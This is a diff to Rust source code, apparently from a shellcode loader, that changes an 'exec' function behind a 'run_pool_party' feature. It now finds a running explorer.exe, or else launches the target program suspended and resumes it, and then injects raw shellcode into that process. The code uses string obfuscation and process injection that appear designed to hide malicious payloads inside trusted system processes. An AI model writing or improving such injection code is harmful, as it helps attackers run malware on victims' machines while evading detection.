@@ -5,16 +5,34 @@ use self::structs::*;
 use std::ffi::c_void;
 use std::ptr;
 use obfstr::obfstr;
+use windows_sys::Win32::System::Threading::{CREATE_SUSPENDED};
 
 #[cfg(feature = "run_pool_party")]
 pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &str) -> Result<(), String> {
-    let process_info = crate::utils::remote::create_process(target_program, 0)?;
+    let pid = if target_program.to_lowercase().contains("explorer.exe") {
+        // Try to find existing explorer process first
+        crate::utils::remote::get_process_id_by_name("explorer.exe")
+    } else {
+        None
+    };
 
-    // Wait for process to initialize thread pool
-    crate::api::delay_execution_seconds(2)?;
+    let process_id = if let Some(existing_pid) = pid {
+        #[cfg(feature = "debug")]
+        crate::utils::print_message(&format!("Found existing explorer.exe (PID: {}), injecting...", existing_pid));
+        existing_pid
+    } else {
+        let process_info = crate::utils::remote::create_process(target_program, CREATE_SUSPENDED)?;
+        
+        // Resume immediately with SW_HIDE
+        crate::api::resume_thread(process_info.hThread)?;
+        
+        // Wait for process to initialize
+        crate::api::delay_execution_seconds(5)?;
+        process_info.dwProcessId
+    };
 
     let shellcode = std::slice::from_raw_parts(shellcode_ptr as *const u8, shellcode_len);
-    inject(process_info.dwProcessId, shellcode)?;
+    inject(process_id, shellcode)?;
 
     Ok(())
 }
